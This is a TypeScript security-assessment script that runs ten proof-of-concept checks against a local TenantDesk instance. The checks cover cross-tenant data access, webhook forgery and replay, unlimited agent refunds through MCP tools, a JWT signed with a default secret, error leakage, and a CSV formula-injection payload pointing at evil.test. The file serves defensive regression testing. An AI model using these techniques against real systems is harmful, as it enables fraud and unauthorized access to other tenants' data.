/**
 * Security assessment checks for TenantDesk.
 * Runs every proof-of-concept against the code currently checked out and prints
 * VULNERABLE or NOT VULNERABLE per finding. Run on tag v0.1.0 and on main to compare.
 *
 *   npx tsx assessment/poc.ts
 */
import { createHmac } from "node:crypto";
import type { AddressInfo } from "node:net";
import { SignJWT } from "jose";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { createDb } from "../src/db.js";
import { createApp } from "../src/app.js";
import { ALL_SCOPES, issueToken } from "../src/auth.js";
import { startHttp } from "../src/http.js";

type Result = { id: string; title: string; vulnerable: boolean; evidence: string };
const results: Result[] = [];

async function main() {
  const db = await createDb();
  const app = await createApp({ db, env: { NODE_ENV: "test", LOG_LEVEL: "silent" } });
  const http = await startHttp(app, 0);
  const base = `http://localhost:${(http.address() as AddressInfo).port}`;
  const ben = await issueToken("u_ben"); // Acme agent
  const ana = await issueToken("u_ana"); // Acme admin
  const authed = (t: string) => ({ authorization: `Bearer ${t}` });

  async function mcpAs(token: string) {
    const c = new Client({ name: "poc", version: "1" });
    await c.connect(new StreamableHTTPClientTransport(new URL(`${base}/mcp`), { requestInit: { headers: authed(token) } }));
    return {
      call: async (name: string, args: Record<string, unknown>) =>
        (await c.callTool({ name, arguments: args })) as { isError?: boolean; content: { text: string }[] },
      close: () => c.close(),
    };
  }

  // TD-01 Cross-tenant export via tenant parameter
  {
    const r = await fetch(`${base}/api/customers/export?tenant_id=t_bright`, { headers: authed(ben) });
    const body = await r.text();
    results.push({
      id: "TD-01", title: "Cross-tenant customer export via tenant_id parameter",
      vulnerable: body.includes("Sam Okafor"),
      evidence: `GET /api/customers/export?tenant_id=t_bright as Acme agent -> ${r.status}, ${body.includes("Sam Okafor") ? "Brightside customers returned" : "only Acme data"}`,
    });
  }

  // TD-02 IDOR on invoice by id
  {
    const r = await fetch(`${base}/api/invoices/inv_b1`, { headers: authed(ben) });
    results.push({
      id: "TD-02", title: "Insecure direct object reference on GET /api/invoices/:id",
      vulnerable: r.status === 200,
      evidence: `GET /api/invoices/inv_b1 (Brightside) as Acme agent -> ${r.status}`,
    });
  }

  // TD-03 MCP tool trusts a tenant argument supplied by the model
  {
    const m = await mcpAs(ben);
    const r = await m.call("list_customers", { tenant_id: "t_bright" });
    const text = r.content[0]?.text ?? "";
    results.push({
      id: "TD-03", title: "MCP tool accepts tenant_id from the model (prompt-injection data access)",
      vulnerable: text.includes("Sam Okafor"),
      evidence: `list_customers {tenant_id:"t_bright"} as Acme agent -> ${text.includes("Sam Okafor") ? "Brightside customers returned" : "only Acme data / rejected"}`,
    });
    await m.close();
  }

  // TD-04 Unsigned / forged Stripe webhook accepted
  {
    const event = { id: "evt_forged_1", type: "invoice.paid", data: { object: { metadata: { invoice_id: "inv_a2" } } } };
    const r = await fetch(`${base}/webhooks/stripe`, { method: "POST", body: JSON.stringify(event), headers: { "content-type": "application/json" } });
    const st = await db.query<{ status: string }>("select status from invoices where id = 'inv_a2'");
    results.push({
      id: "TD-04", title: "Stripe webhook accepted without signature verification",
      vulnerable: st.rows[0].status === "paid",
      evidence: `unsigned invoice.paid for open invoice inv_a2 -> HTTP ${r.status}, invoice status now '${st.rows[0].status}'`,
    });
  }

  // TD-05 Duplicate webhook events double-apply refunds
  {
    const secret = process.env.STRIPE_WEBHOOK_SECRET ?? "whsec_dev_only";
    const event = { id: "evt_refund_1", type: "charge.refunded", data: { object: { amount_refunded: 2000, metadata: { invoice_id: "inv_a4" } } } };
    const raw = JSON.stringify(event);
    for (let i = 0; i < 3; i++) {
      const t = Math.floor(Date.now() / 1000);
      const sig = createHmac("sha256", secret).update(`${t}.${raw}`).digest("hex");
      await fetch(`${base}/webhooks/stripe`, { method: "POST", body: raw, headers: { "stripe-signature": `t=${t},v1=${sig}` } });
    }
    const inv = await db.query<{ refunded_cents: number }>("select refunded_cents from invoices where id = 'inv_a4'");
    results.push({
      id: "TD-05", title: "Webhook events not de-duplicated; refunds double-counted on retry",
      vulnerable: inv.rows[0].refunded_cents !== 2000,
      evidence: `same charge.refunded ($20.00) delivered 3 times -> refunded_cents = ${inv.rows[0].refunded_cents}`,
    });
  }

  // TD-06 Agent can refund in one step with no limit
  {
    const m = await mcpAs(ben);
    const step = await m.call("request_refund", { invoice_id: "inv_a1", amount_cents: 12000, reason: "poc refund by agent" });
    const legacy = await m.call("issue_refund", { invoice_id: "inv_a1", amount_cents: 12000, reason: "poc refund by agent" });
    const inv = await db.query<{ refunded_cents: number }>("select refunded_cents from invoices where id = 'inv_a1'");
    results.push({
      id: "TD-06", title: "Refund tool missing role check, amount cap and human confirmation",
      vulnerable: inv.rows[0].refunded_cents > 0,
      evidence: `Acme agent calls refund for full $120.00 -> request_refund: ${step.isError ? "denied" : "accepted"}, issue_refund: ${legacy.isError ? "denied/absent" : "accepted"}, refunded_cents now ${inv.rows[0].refunded_cents}`,
    });
    await m.close();
  }

  // TD-07 Stale privileges: role and tenant trusted from the token
  {
    // Validly signed and fully scoped, but claiming a role the database no longer gives her.
    const forged = await new SignJWT({ tenant_id: "t_acme", role: "admin", scope: ALL_SCOPES.join(" ") })
      .setProtectedHeader({ alg: "HS256" }).setSubject("u_cara").setIssuer("tenantdesk-dev").setIssuedAt().setExpirationTime("1h")
      .sign(new TextEncoder().encode(process.env.TENANTDESK_JWT_SECRET ?? "dev-only-secret-change-me-dev-only-secret"));
    // Cara is a viewer in the database; a token minted while she was admin should not keep admin rights.
    const m = await mcpAs(forged);
    const r = await m.call("create_ticket", { customer_id: "c_acme_1", subject: "privilege check", body: "viewer writing" });
    results.push({
      id: "TD-07", title: "Role and tenant taken from token claims; downgraded users keep old rights",
      vulnerable: !r.isError,
      evidence: `token with role=admin for user who is now a viewer -> create_ticket ${r.isError ? "denied" : "succeeded"}`,
    });
    await m.close();
  }

  // TD-08 Internal error details returned to the client
  {
    const m = await mcpAs(ana);
    const r = await m.call("search_invoices", { from: "2026-13-45" });
    const text = r.content[0]?.text ?? "";
    // Ignore the tool's own name; flag SQL, table names, driver messages or stack traces.
    const leaks = /select|invoices|syntax|date\/time|postgres|stack/i.test(text.replace(/search_invoices/g, ""));
    results.push({
      id: "TD-08", title: "Database error details exposed to the MCP client",
      vulnerable: leaks,
      evidence: `search_invoices {from:"2026-13-45"} -> "${text.slice(0, 90).replace(/\n/g, " ")}"`,
    });
    await m.close();
  }

  // TD-09 CSV formula injection in export
  {
    await db.query("update customers set name = '=HYPERLINK(\"http://evil.test\",\"Click\")' where id = 'c_acme_3'");
    const r = await fetch(`${base}/api/customers/export`, { headers: authed(ana) });
    const body = await r.text();
    results.push({
      id: "TD-09", title: "CSV export allows spreadsheet formula injection",
      vulnerable: /"=HYPERLINK/.test(body),
      evidence: `customer name starting with '=' exported as ${/"'=HYPERLINK/.test(body) ? "escaped text ('=...)" : "a live formula"}`,
    });
  }

  // TD-10 No audit trail of AI tool calls
  {
    const n = await db.query<{ n: number }>("select count(*)::int as n from audit_log");
    results.push({
      id: "TD-10", title: "No audit trail of actions taken through MCP tools",
      vulnerable: n.rows[0].n === 0,
      evidence: `audit_log rows after the checks above: ${n.rows[0].n}`,
    });
  }

  http.close();
  for (const r of results) console.log(`${r.id}  ${r.vulnerable ? "VULNERABLE    " : "NOT VULNERABLE"}  ${r.title}\n      ${r.evidence}`);
  const n = results.filter((r) => r.vulnerable).length;
  console.log(`\n${n} of ${results.length} checks vulnerable`);
  process.exit(0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
